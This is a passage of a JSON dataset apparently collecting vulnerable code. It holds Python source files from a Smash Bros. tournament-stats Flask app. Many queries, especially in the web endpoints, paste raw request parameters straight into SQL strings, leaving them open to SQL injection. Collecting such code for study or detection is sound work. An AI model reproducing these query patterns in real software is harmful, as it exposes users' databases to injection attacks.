['https://challonge.com/users/kuya_mark96', 'https://austinsmash4.challonge.com']})\nSMASHBREWS_RULS = ('smashbrews', {'enumerated': ['https://challonge.com/Smashbrews###', 'https://challonge.com/smashbrewsS3W###', 'https://challonge.com/smashbrewsS4W###', 'https://challonge.com/smashbrewsS5W###']})\nCOLORADO_SINGLES_URLS = ('colorado', {'enumerated': ['http://smashco.challonge.com/CSUWW###WUS', 'http://smascho.challonge.com/FCWUA###', 'http://smascho.challonge.com/FCWUIB###']})\nCOLORADO_DOUBLES_URLS = ('colorado_doubles', {'enumerated': ['http://smashco.challonge.com/CSUWW###WUD', 'http://smashco.challonge.com/FCWUDC###']})\nCOLORADO_URLS = ('colorado_both', {'enumerated': COLORADO_SINGLES_URLS + COLORADO_DOUBLES_URLS})\nSMS_URLS = ('sms', {'enumerated': ['http://challonge.com/RAA_###', 'http://challonge.com/SMSH_###'], 'users': ['https://challonge.com/users/yellocake']})\n\nDISPLAY_MAP = {'heatwave': 'Heatwave',\n        'NP9ATX': 'NP9',\n        'challonge.com/hw': 'Heatwave',\n        'challonge.com/atx': 'Smashpack',\n        'alibaba': 'Alibaba',\n        'Mothership': 'Mothership',\n        'atxfiles': 'ATX Files',\n        'ARFI': 'ARFI',\n        'arcadian': 'Arcadian',\n        'ooples': 'Ooples',\n        'challonge.com/mbh': 'Michaels Big House',\n        'challonge.com/sth': 'Smash The Halls',\n        'smashbrewsS3': 'Smashbrews S3',\n        'smashbrewsS4': 'Smashbrews S4',\n        'smashbrewsS5': 'Smashbrews S5',\n        'Smashbrews': 'Smashbrews',\n        'smashco': 'CSU',\n        'smascho': 'CSU',\n        'RAA': 'Reading At Alkek'}\n\nPRO_MELEE = MELEE_SINGLES_BRACKETS.MELEE_SINGLES        \nPRO_WIIU = WIIU_BRACKETS.WII_U_BRACKETS\nPRO_SMASH_5 = SMASH_5_BRACKETS.SMASH_5_BRACKETS\n\nSLEEP_TIME = 10 * 60 * 6 #1 hour\nTOURNAMENTS_PER_RANK = 20\n\n\nTEST_URLS = [('test1', ['https://challonge.com/smash_web_test_###']),\n        ('test2', ['https://challonge.com/smash_web_scene_two_###'])]\n\n\"\"\"\nData structure we need -\ndictionary where key is tag_1:\n    value is dictionary:\n        key for inner dictionary is tag_2, value is a list\n        the list has (date_of_set, result)\n        one (date, result) for every set they have played\n\"\"\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DKelle/Smash_stats/blob/7dadd601bcf554ab6cea362b643d60678759cd0f",
        "file_path": "/endpoints.py",
        "source": "from flask import Blueprint, request, render_template, send_from_directory\nfrom player_web import get_web\nimport json\nfrom database_writer import get_db\nimport constants\nimport bracket_utils\nimport requests\nimport logger\n#sys.path.insert(0, '/home/ubuntu/Smash_stats/tools')\n#from tools import  \n\ndb = None\n\nBASE_URL = 'https://localhost:5000'\nendpoints = Blueprint('endpoints', __name__)\n\nLOG = logger.logger(__name__)\n\n@endpoints.route(\"/\")\ndef main():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=\"christmasmike\")\n    data = get_web(db=db)\n    return render_template('libraries/html/web.html', data=data, tag=tag)\n    #return render_template('libraries/html/temp.html', data=data, tag=tag)\n\n@endpoints.route(\"/temp\")\ndef temp():\n    return render_template('libraries/temp/index.html')\n\n@endpoints.route(\"/player\")\ndef player():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=\"christmasmike\").capitalize()\n    sql = \"SELECT count(*) FROM matches WHERE winner='{}'\".format(tag)\n    wins = db.exec(sql)[0][0]\n    \n    sql = \"SELECT count(*) FROM matches WHERE (player1='{}' or player2='{}') AND NOT winner='{}'\".format(tag, tag, tag)\n    losses = db.exec(sql)[0][0]\n\n    percentage = (0.0+int(1000*((0.0+wins)/(0.0+losses+wins))))/10\n\n    sql = \"select rank from players join ranks where players.scene=ranks.scene and players.tag=ranks.player and players.tag='{}' order by date desc limit 1;\".format(tag)\n    res = db.exec(sql)\n    rank = 0\n    if len(res) > 0:\n        rank = res[0][0]\n\n\n    sql = \"SELECT scene FROM players WHERE tag='{}'\".format(tag)\n    scene = db.exec(sql)[0][0].capitalize()\n\n    ranks_data, months_ranked = bracket_utils.get_ranking_graph_data(db, tag)\n    ranks_data = json.dumps(ranks_data)\n    months_ranked = json.dumps(months_ranked)\n\n    brackets_data = bracket_utils.get_bracket_graph_data(db, tag)\n    months_played = []\n    for s in brackets_data:\n        months_played.extend([bracket[0] for bracket in brackets_data[s]])\n\n    months_played = sorted(months_played)\n\n    return render_template('libraries/html/player.html', tag=tag, wins=wins, losses=losses, percentage=percentage, rank=rank, scene=scene, ranks_data=ranks_data, months_ranked=months_ranked, brackets_data=brackets_data, months_played=months_played)\n\n@endpoints.route(\"/ranks\")\ndef ranks():\n    if db == None:\n        init()\n\n    scene = request.args.get('scene', default='austin')\n    date = request.args.get('date')\n \n    # If no date was provided, pick the date of the latest tournament\n    if date == None:\n        sql = \"SELECT distinct date FROM ranks WHERE scene='{}' ORDER BY date DESC LIMIT 1;\".format(scene)\n        res = db.exec(sql)\n        date = res[0][0]\n\n    # Get all the urls that this player has participated in\n    sql = \"SELECT * FROM ranks WHERE scene = '{}' and date='{}'\".format(scene, date)\n    res = db.exec(sql)\n\n    # Make a dict out of this data\n    # eg {'christmasmike': 50}\n    cur_ranks = {}\n    for r in res:\n        tag = r[1]\n        rank = r[2]\n\n        cur_ranks[tag] = rank\n\n    # Now get the ranks from last month, so we know if these players went up or down\n    y, m, d = date.split('-')\n    prev_date = bracket_utils.get_previous_month(date)\n\n    # Get all the urls that this player has participated in\n    sql = \"SELECT * FROM ranks WHERE scene = '{}' and date='{}'\".format(scene, prev_date)\n    res = db.exec(sql)\n\n    # Make a dict out of this data\n    # eg {'christmasmike': 50}\n    prev_ranks = {}\n    for r in res:\n        tag = r[1]\n        rank = r[2]\n\n        prev_ranks[tag] = rank\n\n    return render_template('libraries/html/ranks.html', cur_ranks=cur_ranks, prev_ranks=prev_ranks, scene=scene, date=date)\n\n@endpoints.route(\"/base\")\ndef base():\n    return render_template('libraries/templates/html/base.html')\n\n@endpoints.route(\"/wins\")\ndef wins():\n    if db == None:\n        init()\n\n    player = request.args.get('tag', default=\"christmasmike\")\n    sql = \"SELECT * FROM matches WHERE winner = '\"+str(player)+\"' ORDER BY date DESC;\"\n    result = db.exec(sql)\n\n    result = [str(x) for x in result]\n    result = '\\n'.join(result)\n    return json.dumps(result)\n\n@endpoints.route(\"/losses\")\ndef losses():\n    if db == None:\n        init()\n\n    player = request.args.get('tag', default=\"christmasmike\")\n    sql = \"SELECT * FROM matches WHERE (player1 = '\"+str(player)+\"' OR \"\\\n            +\"player2 = '\"+str(player)+\"') AND winner != '\"+str(player)+\"' ORDER BY date DESC;\"\n    result = db.exec(sql)\n\n    result = [str(x) for x in result]\n    return json.dumps('\\n'.join(result))\n\n@endpoints.route(\"/h2h\")\ndef h2h():\n    if db == None:\n        init()\n\n    player1 = request.args.get('tag1', default=\"christmasmike\")\n    player2 = request.args.get('tag2', default=\"christmasmike\")\n    sql = \"SELECT * FROM matches WHERE (player1 = '\"+str(player1)+\"' OR \"\\\n            +\"player2 = '\"+str(player1)+\"') AND (player1 = '\"+str(player2)+\"' OR \"\\\n            +\"player2 = '\"+str(player2)+\"') ORDER BY date DESC;\"\n    result = db.exec(sql)\n    return json.dumps(result)\n\n\n@endpoints.route(\"/entrants\")\ndef entrants(players=None):\n    if db == None:\n        init()\n\n    sql = \"SELECT base_url FROM analyzed;\"\n    urls = db.exec(sql, debug=False)\n\n    # Create an array ofall the players that we want to search for\n    if players == None:\n        players = []\n        for p in request.args:\n            players.append(request.args[p])\n\n    for p in players:\n        # Create a long 'OR' clause. One for each 'url'\n        # eg WHERE url = \"url1\" OR url = \"url2\" ...\n        or_clause = \"url = '{}' \".format(urls[0][0]) + \" \".join([\"OR url = '{}'\".format(url[0]) for url in urls[1:]])\n        \n        # Grab all the URLs that this player has played in\n        sql = \"SELECT url, min(scene) scene, min(display_name) display_name, min(date) date FROM matches \\\n                WHERE (player1='{}' or player2='{}') AND ({}) GROUP BY url ORDER BY date DESC;\".format(p, p, or_clause)\n        \n        # This should be a list of all the URLs that all of the players have been in together\n        urls = db.exec(sql)\n\n        # If we ever get to an empty set of URLs, just return\n        if len(urls) == 0:\n            return json.dumps([])\n\n    #result = [str(x) for x in result]\n    return json.dumps(urls)\n    return json.dumps('\\n'.join(urls))\n\n@endpoints.route(\"/placings\")\ndef placings():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default='christmas mike')\n\n    # Get all the urls that this player has participated in\n    sql = \"SELECT * FROM placings WHERE player = '{}'\".format(tag)\n    results = list(db.exec(sql))\n    results.sort(key=lambda x: int(x[2]))\n\n    return json.dumps(results)\n\n@endpoints.route('/matches_at_date')\ndef matches_at_date():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=None)\n    date = request.args.get('date', default=None)\n\n    if tag and date:\n        y, m, d = date.split('-')\n        previous_m = '12' if m == '01' else str(int(m)-1)\n        previous_m = previous_m.zfill(2)\n        previous_y = str(int(y)-1) if m == '01' else y\n        previous_date = '{}-{}-{}'.format(previous_y, previous_m, d)\n        sql = \"select * from matches where (player1='{}' or player2='{}') and date<='{}' and date>='{}'\".format(tag, tag, date, previous_date); \n\n        data = db.exec(sql)\n\n        return json.dumps(data)\n    \n    return ''\n\n@endpoints.route('/tournament_wins')\ndef tournament_wins():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=None)\n    date = request.args.get('date', default=None)\n\n    if tag and date:\n        sql = \"select player1, place, date, score from matches join placings on matches.url=placings.url and matches.player1=placings.player \\\n                where winner='{}' and player2='{}' and date='{}';\".format(tag, tag, date)\n        data = db.exec(sql)\n        sql = \"select player2, place, date, score from matches join placings on matches.url=placings.url and matches.player2=placings.player \\\n                where winner='{}' and player1='{}' and date='{}';\".format(tag, tag, date)\n        data = data + db.exec(sql)\n\n        data = [r for r in data]\n        data.sort(key=lambda x: int(x[1]))\n\n        # Before we return this data, reformat score data from [2,1] -> 2 - 1, for eg\n        def reformat(score):\n            score = score.replace('[', '')\n            score = score.replace(']', '')\n            win, loss = score.split(',')\n            score = '{} - {}'.format(win, loss)\n            return score\n        data = [[r[0], r[1], r[2], reformat(r[3])] for r in data]\n        return json.dumps(data)\n    \n    return ''\n\n@endpoints.route('/tournament_losses')\ndef tournament_losses():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=None)\n    date = request.args.get('date', default=None)\n\n    if tag and date:\n        sql = \"select player1, place, date, score from matches join placings on matches.url=placings.url and matches.player1=placings.player \\\n                where winner!='{}' and player2='{}' and date='{}';\".format(tag, tag, date)\n        data = db.exec(sql)\n\n        sql = \"select player2, place, date, score from matches join placings on matches.url=placings.url and matches.player2=placings.player \\\n                where winner!='{}' and player1='{}' and date='{}';\".format(tag, tag, date)\n        data = data + db.exec(sql)\n\n        data = [r for r in data]\n        data.sort(key=lambda x: int(x[1]))\n\n        # Before we return this data, reformat score data from [2,1] -> 2 - 1, for eg\n        def reformat(score):\n            score = score.replace('[', '')\n            score = score.replace(']', '')\n            win, loss = score.split(',')\n            score = '{} - {}'.format(win, loss)\n            return score\n        data = [[r[0], r[1], r[2], reformat(r[3])] for r in data]\n        return json.dumps(data)\n    \n    return ''\n\n@endpoints.route('/big_wins')\ndef big_wins():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=None)\n    date = request.args.get('date', default=None)\n    scene = request.args.get('scene', default=None)\n    \n    valid = not (tag == None and date == None)\n    if valid:\n        # This sql statement is a bit of a doozy...\n        select = 'select ranks.player, ranks.rank, matches.date, matches.score'\n        frm = 'from matches join ranks where ((ranks.player=matches.player1 and matches.player2=\"{}\")'.format(tag)\n        player_where = 'or (ranks.player=matches.player2 and matches.player1=\"{}\")) and winner=\"{}\"'.format(tag, tag)\n        date_where = 'and matches.scene=ranks.scene and datediff(ranks.date, matches.date)<=31 and ranks.date>matches.date'\n        also_date_where = 'and ranks.date=\"{}\"'.format(date)\n        scene_where = 'and ranks.scene=\"{}\"'.format(scene)\n        order = 'order by rank;'\n\n\n        sql = '{} {} {} {} {} {} {}'.format(select, frm, player_where, date_where, also_date_where, scene_where, order)\n        data = db.exec(sql)\n\n        # Before we return this data, reformat score data from [2,1] -> 2 - 1, for eg\n        def reformat(score):\n            score = score.replace('[', '')\n            score = score.replace(']', '')\n            win, loss = score.split(',')\n            score = '{} - {}'.format(win, loss)\n            return score\n        data = [[r[0], r[1], r[2], reformat(r[3])] for r in data]\n        return json.dumps(data)\n\n    return ''\n\n@endpoints.route('/bad_losses')\ndef bad_losses():\n    if db == None:\n        init()\n\n    tag = request.args.get('tag', default=None)\n    date = request.args.get('date', default=None)\n    scene = request.args.get('scene', default=None)\n\n    if tag and date:\n        # This sql statement is a bit of a doozy...\n        select = 'select ranks.player, ranks.rank, matches.date, matches.score'\n        frm = 'from matches join ranks where ((ranks.player=matches.player1 and matches.player2=\"{}\")'.format(tag)\n        player_where = 'or (ranks.player=matches.player2 and matches.player1=\"{}\")) and not winner=\"{}\"'.format(tag, tag)\n        date_where = 'and matches.scene=ranks.scene and datediff(ranks.date, matches.date)<=31 and ranks.date>matches.date'\n        also_date_where = 'and ranks.date=\"{}\"'.format(date)\n        scene_where = 'and ranks.scene=\"{}\"'.format(scene)\n        order = 'order by rank desc;'\n\n        sql = '{} {} {} {} {} {} {}'.format(select, frm, player_where, date_where, also_date_where, scene_where, order)\n        data = db.exec(sql)\n\n        # Before we return this data, reformat score data from [2,1] -> 1-2, for eg\n        def reformat(score):\n            score = score.replace('[', '')\n            score = score.replace(']', '')\n            win, loss = score.split(',')\n            score = '{} - {}'.format(loss, win)\n            return score\n        data = [[r[0], r[1], r[2], reformat(r[3])] for r in data]\n\n        return json.dumps(data)\n    \n    return ''\n\n@endpoints.route('/web')\ndef web(tag=None):\n    if db == None:\n        init()\n\n    return json.dumps(get_web(tag, db=db))\n\ndef init():\n    global db\n    db = get_db()\n    \n@endpoints.route('/templates/<path:path>')\ndef serve(path):\n    return send_from_directory('templates', path)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DKelle/Smash_stats/blob/7dadd601bcf554ab6cea362b643d60678759cd0f",
        "file_path": "/process_data.py",
        "source": "import logger\nimport datetime\nimport constants\nimport get_results\nimport time\nimport copy\nimport player_web\nimport bracket_utils\nfrom get_ranks import get_ranks\nfrom get_results import get_coalesced_tag, sanitize_tag\nimport re\nfrom tweet import tweet\n\nLOG = logger.logger(__name__)\n\nclass processData(object):\n    def __init__(self, db):\n        LOG.info('loading constants for process')\n        self.db = db\n\n    def process(self, bracket, scene, display_name, new_bracket=False):\n        # Before we do anything, check if this url has been analyzed already, and bomb out\n        sql = \"SELECT * FROM analyzed WHERE base_url = '\" + str(bracket) + \"';\"\n        result = self.db.exec(sql)\n        if len(result) > 0:\n            LOG.info('tried to analyze {}, but has already been done.'.format(bracket))\n            return\n\n        # Send this bracket to get_results\n        # We know the bracket is valid if it is from smashgg\n        if 'smash.gg' in bracket:\n            success = get_results.process(bracket, scene, self.db, display_name)\n            if success:\n                self.insert_placing_data(bracket, new_bracket)\n            else:\n                #TODO add this URL to a table called 'failed_smashgg_brackets' or something\n                LOG.exc('Analyzing smashgg tournament {} was not successful'.format(bracket))\n\n        else:\n            html, status = bracket_utils.hit_url(bracket)\n            if status == 200 and bracket_utils.is_valid(html):\n                get_results.process(bracket, scene, self.db, display_name)\n                self.insert_placing_data(bracket, new_bracket)\n\n    def insert_placing_data(self, bracket, new_bracket):\n        LOG.info('we have called insert placing data on bracket {}'.format(bracket))\n        # Get the html from the 'standings' of this tournament\n        tournament_placings = bracket_utils.get_tournament_placings(bracket)\n\n        for player, placing in tournament_placings.items():\n            player = sanitize_tag(player)\n\n            # Coalesce tag\n            player = get_coalesced_tag(player)\n            sql = \"INSERT INTO placings (url, player, place) VALUES \" \\\n                    + \" ('{}', '{}', '{}')\".format(bracket, player, placing)\n\n            self.db.exec(sql)\n\n            if 'christmasmike' == player and new_bracket:\n                if placing < 10:\n                    msg = \"Congrats on making {} dude! You're the best.\".format(placing)\n                    tweet(msg)\n\n        LOG.info(\"tournament placings for {} are {}\".format(bracket, tournament_placings))\n\n    def check_and_update_ranks(self, scene):\n        # There are 2 cases here:\n        #   1) Ranks have never been calculated for this scene before\n        #       - This means we need to calculate what the ranks were every month of this scenes history\n        #       - We should only do this if ranks don't already exist for this scene\n        #   2) Ranks have been calculated for this scene before\n        #       - We already have bulk ranks. We should check if it has been more than 1 month since we last\n        #           calculated ranks. If so, calculate again with the brackets that have come out this month\n\n        LOG.info('About to check if ranks need updating for {}'.format(scene))\n        # First, do we have any ranks for this scene already?\n        sql = 'select count(*) from ranks where scene=\"{}\";'.format(scene)\n        res = self.db.exec(sql)\n        count = res[0][0]\n\n        n = 5 if (scene == 'pro' or scene == 'pro_wiiu') else constants.TOURNAMENTS_PER_RANK\n        if count == 0:\n            LOG.info('Detected that we need to bulk update ranks for {}'.format(scene))\n            # Alright, we have nothing. Bulk update ranks\n            first_month = bracket_utils.get_first_month(self.db, scene)\n            last_month = bracket_utils.get_last_month(self.db, scene)\n            \n            # Iterate through all tournaments going month by month, and calculate ranks\n            months = bracket_utils.iter_months(first_month, last_month, include_first=False, include_last=True)\n            for month in months:\n                urls, _ = bracket_utils.get_n_tournaments_before_date(self.db, scene, month, n)\n                self.process_ranks(scene, urls, month)\n        else:\n\n            # Get the date of the last time we calculated ranks\n            sql = \"select date from ranks where scene='{}' order by date desc limit 1;\".format(scene)\n            res = self.db.exec(sql)\n            last_rankings_date = res[0][0]\n\n            # Check to see if it's been more than 1 month since we last calculated ranks\n            more_than_one_month = bracket_utils.has_month_passed(last_rankings_date)\n            if more_than_one_month:\n                # Get only the last n tournaments, so it doesn't take too long to process\n                today = datetime.datetime.today().strftime('%Y-%m-%d')\n                msg = 'Detected that we need up update monthly ranks for {}, on {}'.format(scene, today)\n                LOG.info(msg)\n\n                # We should only ever calculate ranks on the 1st. If today is not the first, log error\n                if not today.split('-')[-1] == '1':\n                    LOG.exc('We are calculating ranks today, {}, but it isnt the first'.format(today))\n\n                months = bracket_utils.iter_months(last_rankings_date, today, include_first=False, include_last=True)\n                for month in months:\n                    # Make sure that we actually have matches during this month\n                    # Say we are trying to calculate ranks for 2018-05-01, the player would need to have matches during 2018-04-01, 2018-04-30\n                    prev_date = bracket_utils.get_previous_month(month)\n                    brackets_during_month = bracket_utils.get_tournaments_during_month(self.db, scene, prev_date)\n\n                    if len(brackets_during_month) > 0:\n                        tweet('Calculating {} ranks for {}'.format(month, scene))\n                        urls, _ = bracket_utils.get_n_tournaments_before_date(self.db, scene, month, n)\n                        self.process_ranks(scene, urls, month)\n\n            else:\n                LOG.info('It has not yet been 1 month since we calculated ranks for {}. Skipping'.format(scene))\n\n\n    def process_ranks(self, scene, urls, recent_date):\n        PLAYER1 = 0\n        PLAYER2 = 1\n        WINNER = 2\n        DATE = 3\n        SCENE = 4\n\n        # make sure if we already have calculated ranks for these players at this time, we do not do it again\n        sql = \"SELECT * FROM ranks WHERE scene = '{}' AND date='{}';\".format(str(scene), recent_date)\n        res = self.db.exec(sql)\n        if len(res) > 0:\n            LOG.info('We have already calculated ranks for {} on date {}. SKipping'.format(scene, recent_date))\n            return\n\n        matches = bracket_utils.get_matches_from_urls(self.db, urls)\n        LOG.info('About to start processing ranks for scene {} on {}'.format(scene, recent_date))\n\n        # Iterate through each match, and build up our dict\n        win_loss_dict = {}\n        for match in matches:\n            p1 = match[PLAYER1]\n            p2 = match[PLAYER2]\n            winner = match[WINNER]\n            date = match[DATE]\n\n            #Add p1 to the dict\n            if p1 not in win_loss_dict:\n                win_loss_dict[p1] = {}\n\n            if p2 not in win_loss_dict[p1]:\n                win_loss_dict[p1][p2] = []\n\n            # Add an entry to represent this match to p1\n            win_loss_dict[p1][p2].append((date, winner == p1))\n\n            # add p2 to the dict\n            if p2 not in win_loss_dict:\n                win_loss_dict[p2] = {}\n\n            if p1 not in win_loss_dict[p2]:\n                win_loss_dict[p2][p1] = []\n\n            win_loss_dict[p2][p1].append((date, winner == p2))\n\n        ranks = get_ranks(win_loss_dict)\n\n        tag_rank_map = {}\n        for i, x in enumerate(ranks):\n            points, player = x\n            rank = len(ranks) - i\n\n            sql = \"INSERT INTO ranks (scene, player, rank, points, date) VALUES ('{}', '{}', '{}', '{}', '{}');\"\\\n                    .format(str(scene), str(player), int(rank), str(points), str(recent_date))\n            self.db.exec(sql)\n\n            # Only count this player if this is the scene he/she belongs to\n            sql = \"SELECT scene FROM players WHERE tag='{}';\".format(player)\n            res = self.db.exec(sql)\n\n            if len(res) == 0 or res[0][0] == scene:\n                # Also create a list to update the player web\n                map = {'rank':rank, 'total_ranked':len(ranks)}\n                tag_rank_map[player] = map\n\n        player_web.update_ranks(tag_rank_map)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DKelle/Smash_stats/blob/7dadd601bcf554ab6cea362b643d60678759cd0f",
        "file_path": "/validURLs.py",
        "source": "from database_writer import get_db\nfrom process_data import processData\nfrom threading import Thread\nimport logger\nimport bracket_utils\nimport constants\nimport time\nfrom tweet import tweet\n\nanalyzed_scenes = False\nrun_pros = True\nshould_tweet = True\n\nLOG = logger.logger(__name__)\n\nclass validURLs(object):\n    def __init__(self, scenes, testing=False, db_name='smash'):\n        global should_tweet\n        self.start_time = time.time()\n        self.testing = testing\n        self.scenes = scenes\n        db_name = 'smash_test' if testing else db_name\n        self.db = get_db(db=db_name)\n\n        # Should we tweet when we are done analyzing? Only if we are totally repopulating\n        sql = 'SELECT count(*) FROM matches'\n        res = self.db.exec(sql)\n        if res[0][0] == 0:\n            should_tweet = True\n\n        # Create a processor to analyze new matches\n        self.data_processor = processData(self.db) \n        LOG.info(\"validURL being created\")\n\n\n    def init(self):\n        if not self.testing:\n            while True:\n                LOG.info('About to create analyziz threads')\n                self.create_analysis_threads()\n                LOG.info('just finished with analysis threads')\n                time.sleep(constants.SLEEP_TIME)\n                LOG.info('Just finished sleeping')\n\n        # If we are testing, we only want to run once, and then check our state\n        else:\n            self.create_analysis_threads()\n\n    def create_analysis_threads(self):\n        global analyzed_scenes\n        self.start_time = time.time()\n        # Create one thread to analyze each scene\n        threads = []\n\n        num_threads = 3\n        length = len(self.scenes)\n        for i in range(num_threads):\n            i1 = int((length/num_threads)*i)\n            i2 = int((length/num_threads)*(i+1))\n            chunk = self.scenes[i1:i2]\n            name = [scene.get_name() for scene in chunk]\n            t = Thread(target=self.analyze_scenes, name=str(name), args=(chunk,))\n            LOG.info('Trying to start the analysis thread for scenes {}'.format(t.name))\n            t.start()\n            threads.append(t)\n\n        # Start the pros\n        # Have we analyzed them before?\n        #sql = \"SELECT * FROM players WHERE scene='pro';\"\n        #res = self.db.exec(sql)\n        #if run_pros and len(res) == 0 and not self.testing:\n        #    # Start 1 thread for melee and 1 thread for wiiu\n        #    LOG.info('about to start pros')\n        #    urls = constants.PRO_MELEE\n        #    t = Thread(target=self.analyze_smashgg, name='pro', args=(urls, 'pro',))\n        #    t.daemon = True\n        #    t.start()\n        #    threads.append(t)\n\n        #    # Now wiiu\n        #    urls = constants.PRO_WIIU\n        #    t = Thread(target=self.analyze_smashgg, name='pro_wiiu', args=(urls, 'pro_wiiu',))\n        #    t.daemon = True\n        #    t.start()\n        #    threads.append(t)\n        #    \n        #    # TODO smash5\n        #    # Now 5\n        #    #urls = constants.PRO_SMASH_5\n        #    #t = Thread(target=self.analyze_smashgg, name='pro_smash_5', args=(urls, 'pro_smash_5',))\n        #    #t.daemon = True\n        #    #t.start()\n        #    #threads.append(t)\n\n\n        #else:\n        #    LOG.info('Skipping pros because it has been done')\n\n        for t in threads:\n            LOG.info('abouto call join for the analysis thread {}'.format(t.name))\n            t.join()\n            seconds_to_analyze = time.time() - self.start_time\n            minutes = seconds_to_analyze / 60\n            LOG.info('joining for the analysis thread {} in {} minutes'.format(t.name, minutes))\n            if not analyzed_scenes and should_tweet:\n                tweet('joining for the analysis thread  {} in {} minutes'.format(t.name, minutes))\n        LOG.info('we have joined all threads. Should tweet after this')\n\n        # If this was the first time we ran, mark pro brackets as complete\n        #for name in ['pro', 'pro_wiiu']:\n        #    sql = \"SELECT * FROM ranks WHERE scene='{}';\".format(name)\n        #    res = self.db.exec(sql)\n        #    if len(res) == 0 and not self.testing and run_pros:\n        #        LOG.info('PRO RANKS: make {} ranks'.format(name))\n\n        #        # After all the matches from this scene have been processed, calculate ranks\n        #        if not analyzed_scenes and should_tweet:\n        #            tweet('About to start ranking for scene {}'.format(name))\n        #        self.data_processor.check_and_update_ranks(name)\n        \n        # If this is the first time that we have gone through all the scenes, tweet me\n        if not analyzed_scenes and should_tweet:\n            analyzed_scenes = True\n            seconds_to_analyze = time.time() - self.start_time\n            minutes = seconds_to_analyze / 60\n            LOG.info('Just finished analyzing scenes for the first time. It took {} minutes. About to tweet'.format(minutes))\n            tweet('Done loading scene data. Took {} minutes'.format(minutes))\n\n    def analyze_smashgg(self, urls, name):\n        LOG.info('we are about to analyze scene {} with {} brackets'.format(name, len(urls)))\n        for url in urls:\n            # Before we process this URL, check to see if we already have\n            sql = \"SELECT * FROM analyzed where base_url='{}'\".format(url)\n            res = self.db.exec(sql)\n            if len(res) == 0:\n\n                display_name = bracket_utils.get_display_base(url)\n\n                # We don't care about doubles tournaments\n                if 'doubles' in display_name.lower() or 'dubs' in display_name.lower():\n                    LOG.info('We are skipping the tournament {} because it is a doubles tournament'.format(display_name))\n                    continue\n\n                LOG.info('About to process pro bracket {}'.format(url))\n                self.data_processor.process(url, name, display_name)\n            else:\n                LOG.info(\"Skpping pro bracket because it has already been analyzed: {}\".format(url))\n        \n    def analyze_scenes(self, chunk):\n        # We've been given a chunk of scenes to analyze\n        # So do\n\n        for scene in chunk:\n            self.analyze_scene(scene)\n\n    def analyze_scene(self, scene):\n        base_urls = scene.get_base_urls()\n        users = scene.get_users()\n        name = scene.get_name()\n        LOG.info('found the following users for scene {}: {}'.format(name, users))\n\n        # This scene might have one user who always posts the brackets on their challonge account\n        for user in users:\n            # Have we analyzed this user before?\n            sql = \"SELECT * FROM user_analyzed WHERE user='{}';\".format(user)\n            results = self.db.exec(sql)\n\n            # Did we have any matches in the database?\n            if len(results) > 0:\n                # We have analyzed this user before. Just grab one page of brackets to see if there have been any new tournaments\n                # eg, just look at /users/christmasmike?page=1 instead of all the pages that exist\n                most_recent_page = bracket_utils.get_brackets_from_user(user, pages=1)\n                for bracket in most_recent_page:\n                    LOG.info('here are the brackets from the most recent page of user {}: {}'.format(user, most_recent_page))\n                    # This user has already been analyzed, there's a good chance this bracket has been analyzed also\n                    sql = \"SELECT * FROM user_analyzed WHERE url='{}' AND user='{}';\".format(bracket, user)\n                    results = self.db.exec(sql)\n\n                    if len(results) == 0:\n                        # This is a new bracket that must have been published in the last hour or so\n                        LOG.info('found this url from a user: {} {}'.format(bracket, user))\n                        display_name = bracket_utils.get_display_base(bracket)\n                        # We don't care about doubles tournaments\n                        if 'doubles' in display_name.lower() or 'dubs' in display_name.lower():\n                            LOG.info('We are skipping the tournament {} because it is a doubles tournament'.format(display_name))\n                            continue\n\n                        self.data_processor.process(bracket, name, display_name)\n\n                        # mark this bracket as analyzed\n                        sql = \"INSERT INTO user_analyzed (url, user, scene) VALUES ('{}', '{}', '{}');\".format(bracket, user, name)\n                        self.db.exec(sql)\n\n                        # Tweet that we found a new bracket\n                        msg = \"Found new {} bracket: {}\".format(name, bracket)\n                        tweet(msg)\n                    else:\n                        LOG.info('url {} is not new for user {}'.format(bracket, user))\n            else:\n                # This is a new user, analyze all brackets\n                user_urls = bracket_utils.get_brackets_from_user(user)\n                for url in user_urls:\n                    LOG.info('found this url from a user: {} {}'.format(url, user))\n                    display_name = bracket_utils.get_display_base(url)\n                    # We don't care about doubles tournaments\n                    if 'doubles' in display_name.lower() or 'dubs' in display_name.lower():\n                        LOG.info('We are skipping the tournament {} because it is a doubles tournament'.format(display_name))\n                        continue\n\n                    self.data_processor.process(url, name, display_name)\n\n                    # mark this bracket as analyzed\n                    sql = \"INSERT INTO user_analyzed (url, user, scene) VALUES ('{}', '{}', '{}');\".format(url, user, name)\n                    self.db.exec(sql)\n\n                LOG.info('done with user {}'.format(user))\n\n\n        # This scene might always call their brackets the same thing, eg weekly1, weekly2, weekly3 etc\n        for base_url in base_urls:\n            # attempt to load this data from the database\n            LOG.info('About to start this analysis thread for scene {}'.format(scene.get_name()))\n            sql = \"SELECT first,last FROM valids WHERE base_url = '\" + str(base_url) + \"';\"\n            result = self.db.exec(sql)\n            has_results = len(result) > 0 \n\n            # Did we find a match in the database?\n            if has_results:\n                LOG.info(\"validURLs found values in the database\" + str(result))\n                first = result[0][0]\n                last = result[0][1]\n\n                # Check for a new valid URL\n                new_last = bracket_utils._get_last_valid_url(base_url, last-1)\n\n                if not new_last == last:\n                    if new_last - last > 5:\n                        with open(\"DEBUGOUTPUT.txt\", 'a') as f:\n                            f.write(\"[validURLs.py:55]: found a SHIT TON of new tournaments for bracket: {}\".format(base_url))\n\n                    else:\n                        bracket = base_url.replace('###', str(new_last))\n                        LOG.info('Found new bracket: {}'.format(bracket))\n                        msg = \"Found new bracket: {}\".format(bracket)\n                        tweet(msg)\n\n                    # If there's been a new last, update the database\n                    sql = \"UPDATE valids SET last=\" + str(new_last) + \" where base_url = '\"+str(base_url)+\"';\"\n                    self.db.exec(sql)\n\n\n                    # Analyze each of these new brackets\n                    for i in range(last+1, new_last+1):\n                        # Since this URL is new, we have to process the data\n                        bracket = base_url.replace('###', str(i))\n                        # Create the display name for this bracket\n                        # Eg challonge.com/NP9ATX54 -> NP9 